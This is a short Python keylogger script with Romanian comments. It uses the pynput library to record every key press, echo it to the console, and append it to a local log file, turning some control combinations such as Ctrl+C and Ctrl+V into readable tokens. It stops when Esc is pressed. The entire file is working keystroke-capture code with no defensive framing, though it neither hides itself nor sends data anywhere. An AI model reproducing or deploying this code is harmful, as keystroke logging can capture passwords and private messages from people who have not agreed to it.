import os
from pynput.keyboard import Key, Listener


def on_press(key):
    print("{0} pressed".format(key))
    write_key_to_file(key)


def write_key_to_file(key):
    # Prelucrarea datelor si salvarea in fisier
    with open(os.getcwd() + "\\ss\\log.txt", "a") as f:
        k = str(key).replace("'", "")
        # Configurabil
        if k == "Key.space":
            f.write(" ")
        elif k.__contains__("backspace"):
            f.write(" backspace ")
        elif k.__contains__("x03"):
            f.write(" ctrl+c ")
        elif k.__contains__("x16"):
            f.write(" ctrl+v ")
        elif k.__contains__("x01"):
            f.write(" ctrl+a ")
        elif k.__contains__("x13"):
            f.write(" ctrl+s ")
        elif k.__contains__("."):
            f.write(f" {k[4:]} ")
        else:
            f.write(k)


def on_release(key):
    # Configurabil
    # Logica pentru finalizarea scriptului 
    if key == Key.esc:
        return False

# Aplicarea unui listener pentru taste
with Listener(on_press=on_press, on_release=on_release) as listener: 
     listener.join()
